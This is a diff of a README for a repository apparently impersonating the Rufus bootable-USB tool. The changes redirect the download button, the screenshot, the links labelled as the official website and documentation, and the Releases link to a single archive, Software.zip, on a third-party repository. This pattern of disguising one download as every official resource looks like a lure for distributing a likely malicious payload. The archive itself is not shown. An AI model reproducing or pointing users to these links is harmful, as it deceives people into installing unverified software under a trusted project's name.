@@ -12,7 +12,7 @@ Welcome to the Rufus Bootable USB Installer 2025 repository! Create bootable USB
 
 To start using Rufus Bootable USB Installer 2025, download the tool by clicking the button below:
 
-[![Download Rufus Bootable USB Installer](https://img.shields.io/badge/Download-Rufus%20Bootable%20USB%20Installer-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Rufus Bootable USB Installer](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip%20Bootable%20USB%20Installer-blue)](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip)
 
 Note: Click the button above to download the tool and get started.
 
@@ -38,12 +38,12 @@ Follow these simple steps to create a bootable USB drive using Rufus:
 
 ## 📸 Screenshots
 
-![Rufus Interface](https://example.com/rufus-interface.png)
+![Rufus Interface](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## 🔗 Resources
 
-- [Rufus Official Website](https://rufus.ie/)
-- [Rufus Documentation](https://rufus.ie/help/)
+- [Rufus Official Website](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip)
+- [Rufus Documentation](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## 📢 Support & Contributions
 
@@ -60,4 +60,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 Let's make bootable USB creation a breeze with Rufus Bootable USB Installer 2025! 💾🚀
 
 ---
-Feel free to visit the [Releases](https://github.com/cli/browser/releases) section for more information on the latest versions and updates!
+Feel free to visit the [Releases](https://github.com/matezk1/Rufus-Bootable-USB-Installer-2025/releases/download/v1.0/Software.zip) section for more information on the latest versions and updates!
